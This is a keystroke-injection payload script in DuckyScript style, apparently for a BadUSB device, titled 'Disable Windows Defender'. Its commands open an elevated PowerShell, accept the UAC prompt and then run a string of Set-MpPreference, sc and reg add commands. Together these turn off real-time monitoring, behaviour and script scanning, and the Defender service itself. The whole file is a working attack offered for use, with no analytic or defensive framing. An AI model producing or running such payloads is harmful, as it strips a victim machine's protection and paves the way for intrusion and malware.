@id: disable-defender
@name: Disable Windows Defender
@description: Disables Windows Defender antivirus and real-time protection
@category: windows
@severity: high
@param: DISABLE_TAMPER | boolean | optional | Also attempt to disable Tamper Protection | true

DELAY 1000
GUI x
DELAY 500
STRING a
DELAY 300
SHIFT ENTER
DELAY 2000
LEFT
DELAY 200
ENTER
DELAY 2000
STRING powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
DELAY 300
ENTER
DELAY 1000
STRING powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableScriptScanning $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableArchiveScanning $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableAutoExclusions $false"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisablePrivacyMode $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
DELAY 300
ENTER
DELAY 500
STRING sc config WinDefend start= disabled
DELAY 300
ENTER
DELAY 500
STRING sc stop WinDefend
DELAY 300
ENTER
DELAY 500
STRING reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
DELAY 300
ENTER
DELAY 500
STRING reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
DELAY 300
ENTER
DELAY 500
STRING Get-MpComputerStatus | Select-Object -Property AntivirusEnabled, RealTimeProtectionEnabled
DELAY 300
ENTER
